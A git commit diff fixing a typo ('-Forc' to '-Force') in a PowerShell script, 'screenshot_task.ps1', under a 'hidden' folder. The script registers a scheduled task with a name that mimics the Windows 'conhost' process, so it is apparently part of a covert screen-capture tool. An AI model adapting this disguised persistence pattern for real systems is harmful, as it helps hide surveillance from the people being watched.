2ec37364f79655159f8e76057fc572200341cd5a
JoshuaBrien <joshuabrieno@gmail.com>
2025-05-31 16:05:42 +0800

    Update screenshot_task.ps1

--- Windows/hidden/screenshot_task.ps1
+++ Windows/hidden/screenshot_task.ps1
@@ -4,4 +4,4 @@ $taskTrigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1)
 $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries
 $taskRunAs = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME"
 $scheduledTask = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Principal $taskRunAs -Settings $settings 
-Register-ScheduledTask -TaskName "Raven_conhost_SCtask" -InputObject $scheduledTask -Forc
+Register-ScheduledTask -TaskName "Raven_conhost_SCtask" -InputObject $scheduledTask -Force
